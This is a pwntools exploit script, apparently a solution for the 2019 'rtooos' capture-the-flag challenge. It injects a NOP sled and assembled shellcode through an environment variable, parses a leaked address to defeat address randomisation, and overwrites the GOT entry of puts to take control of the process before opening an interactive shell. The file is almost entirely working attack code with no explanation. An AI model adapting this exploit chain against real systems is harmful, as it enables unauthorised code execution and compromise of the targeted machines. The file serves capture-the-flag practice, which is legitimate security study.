from pwn import *

from subprocess import check_output
is_remote = False

def cmd(cmd):
    p.recvuntil('OS> ')
    p.sendline(cmd)

def env():
    cmd('env')
    return p.recvuntil('[RTOo', drop=True).strip().split('\n')

def set(var):
    cmd('export {}'.format(var))

def set2(var, name):
    cmd('export {}={}'.format(var, name))

def unset(var):
    cmd('unset {}'.format(var))

check_output('nasm shellcode2.asm', shell=True)
shellcode = open('shellcode2').read()

if is_remote:
    vmem_off = -0x8e000
    p = remote('rtooos.quals2019.oooverflow.io', 5000)
else:
    vmem_off = -0x96000
    p = remote('192.168.1.106', 8080)

#p = process('./hypervisor')

cmd('cat README.md')

for i in range(7):
    set2('A', i+1)

set2('A', '\x90' * 0x60 + shellcode)

bads = 0

#while True:
#    addr = int(p.recvuntil('\n'), 16)
#    readable = int(p.recvuntil('\n0x', drop=True), 0)
#    if readable == 0xffffffffffffffff:
#        bads += 1
#        if bads == 2:
#            print('...')
#            continue
#        elif bads >= 3:
#            continue
#    else:
#        bads = 0
#
#    log.info('{:016x}: {}'.format(addr, hex(readable)))

#arb_write = 0x178A
#plt_puts = 0x2130 # Control rdi as well
#
#while True:
#    addr = int(p.recvuntil('\n'), 16)
#    leak = p.recvuntil('\n0x', drop=True)
#    log.info('{:016x}: {}'.format(addr, (leak)))

p.recvuntil('honcho\n')

leak = p.recvline().strip()
log.info('Leak: ' + enhex(leak))

vmem = u64('\x00' + leak + '\x00\x00\x00')
log.info('Vmem @ 0x{:016x}'.format(vmem))

base = vmem + vmem_off
        
log.success('Found base @ 0x{:016x}'.format(base))

shell = int(p.recvline(), 0) + vmem

raw_input()
p.send(p64(0x178a + base))
#p.send(p64(shell))
log.info('Overwrote GOT of puts')

p.interactive()
